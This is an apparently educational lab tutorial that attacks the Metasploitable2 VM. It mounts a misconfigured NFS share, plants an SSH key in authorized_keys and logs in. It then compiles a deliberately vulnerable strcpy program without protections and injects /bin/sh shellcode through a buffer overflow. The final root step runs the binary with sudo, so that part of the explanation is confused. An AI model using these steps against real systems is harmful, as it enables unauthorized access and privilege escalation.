Tutorial:  NFS Share exploit - Shellcode
=========================================

Prerequisite
------------

Download the vulnerable VM:

- `link <https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip/download>`_

Also configure your VM network with bridge access.

To install it in VirtualBox follow:

- https://www.gladir.com/SOFTWARE/VIRTUALBOX/comment-ouvrir-un-fichier-vmdk-existant-dans-virtualbox.htm

Connection:

============ ============
**username** **password**
============ ============
msfadmin     msfadmin
============ ============

Last note: put belgian keyboard:

-  ``setxkbmap be`` (for graphical interface)

-  ``sudo loadkeys be`` (**for linux terminal**)


Exercise
--------

| NFS stands for "Network File System" and allow the storage and
  retrieval of data from multiple disks and directories across a shared
  network. A network file system enables local users to access remote
  data and files in the same way they are accessed locally.

| NFS uses TCP/UDP on **port 2049** for sharing any file/directories.
   [1]_

| The NFS share vulnerability is caused by misconfigured NFS setup which
  basically consist in 3 main files. See
  https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/
  for more technical reason on this.

Let’s start this tutorial:

-  (**On NFS server**)

   #. Put ``ifconfig -a`` to get your IP address <X>

-  | (**On kali: terminal 1**)

   #. With ``nmap`` which allow to make some scan on IP address

   .. centered:: ``nmap -sV <X>``

   ..  image:: nfs2/1-nmap.PNG
       :scale: 60%
       :align: center
       :class: sol-img

   2. | Show the mount information of NFS server with

   .. centered:: ``sudo showmount -e <x>``

   ..  image:: nfs2/2-showmount.PNG
       :scale: 60%
       :align: center
       :class: sol-img

   3. | Create a temporary folder to mount it and mount it:

   .. centered::  ``mkdir /tmp/nfssharevuln``
   .. centered::  ``sudo mount -t nfs <x>:/ /tmp/nfssharevuln``

   ..  image:: nfs2/3-mount.PNG
       :scale: 60%
       :align: center
       :class: sol-img


   4. | Go in the msfadmin folder with:

   .. centered:: ``cd /tmp/nfssharevuln/home/msfadmin``

      Now with ``ls -al`` we can see than there is a hidden folder
      called ``.ssh/``

   ..  image:: nfs2/5-shh.PNG
       :scale: 60%
       :align: center
       :class: sol-img

-  | (**On kali: terminal 2**)

   #. To do the exploit, now generate a ssh key with

   .. centered:: ``ssh-keygen``

   ..  image:: nfs2/6-key.PNG
       :scale: 60%
       :align: center
       :class: sol-img

   2. | And print the result of ``nfssharevuln_rsa``

   ..  image:: nfs2/7-catrsa.PNG
       :scale: 60%
       :align: center
       :class: sol-img

-  | (**On kali: terminal 1**)

   #. Now back on our first terminal, put the content of your key in the
      ``authorized_keys`` file of the ``.ssh`` folder.

   .. centered::  ``echo ssh-rsa <key> >> authorized_keys``

   ..  image:: nfs2/8-echo.PNG
       :scale: 60%
       :align: center
       :class: sol-img

   2. | Finally connect to the NFS with ssh:

   .. centered::  ``ssh -i nfssharevuln_rsa  msfadmin@<x>``

   ..  image:: nfs2/9-connectionssh.PNG
       :scale: 60%
       :align: center
       :class: sol-img

-  | (**ssh:/home/msfadmin**)

   #. | Once done, we will now try to get all privileges, one could do
        that with ``setuid()`` exploit for example. Here we will do that
        with buffer overflow coupled with shellcode.
      | To do so, write a vulnerable code, such as:

      .. code:: C

         #include <stdio.h>
         #include <string.h>
         void reply(char *argv) {
            char buf[256];
            strcpy(buf,argv);
            puts(buf);
         }
         int main(int argc, char* argv[]) {
             if(argc != 2) printf("Usage: ./echo-prompt <arg1>\n");
             else          reply(argv[1]);
             return(0);
         }

      You can use another code of course.

   #. And compile it without any protection since you want to exploit
      it:

      .. centered:: ``gcc -g -fno-stack-protector -z execstack vulnerable.c -o vulnerable_file``

      We also need to disable ASLR with

      .. centered:: ``/proc/sys/kernel/randomize_va_space // put 0``

   #. Everything is now ready, perform the buffer overflow and inject
      the shellcode to become root: (all calculation step for this part
      is skipped, but the following one work for me)

      .. code:: bash

         ./vulnerable_file  `perl -e 'print "\x90"x220 .
             "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89
             \xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
             . "\x90\xf1\xff\xbf"'`

      ..  image:: nfs2/12-noroot.PNG
          :scale: 60%
          :align: center
          :class: sol-img

      .. raw:: html

        <br>

      .. code:: bash

         sudo ./vulnerable_file  `perl -e 'print "\x90"x220 .
             "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89
             \xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
             . "\x90\xf1\xff\xbf"'`

      ..  image:: nfs2/14-root.PNG
          :scale: 60%
          :align: center
          :class: sol-img

      | Everything is done, we are now connect as root !


.. [1]
   https://www.techopedia.com/definition/1845/network-file-system-nfs